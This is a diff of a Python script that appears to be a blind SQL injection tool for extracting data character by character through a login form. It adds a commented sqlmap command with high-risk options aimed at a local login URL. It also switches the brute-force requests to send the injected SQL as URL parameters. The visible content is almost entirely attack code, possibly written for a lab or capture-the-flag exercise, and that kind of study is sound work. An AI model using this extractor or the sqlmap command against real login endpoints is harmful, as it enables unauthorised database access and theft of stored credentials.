@@ -1,5 +1,11 @@
 #!/usr/bin/python3.6
 
+# sqlmap -u "http://127.0.0.1:5000/auth/login?username=*&password=1" --method=post --dbms=mysql --level 5 --risk 3 --hpp --dbs --time-sec 25
+
+
+
+
+
 import requests as r
 import string
 from beautifultable import BeautifulTable as BT
@@ -44,7 +50,7 @@ def brute(sql):
                     continue
                 s = sql % (len(str_so_far) + 1, str_so_far + char, offset)
                 if r.post(
-                    url, data={'username':s,'password':'creds'}
+                    url, params={'username':s,'password':'creds'}
                 ).status_code == 200:
                     str_so_far += char
                     flag2 = True
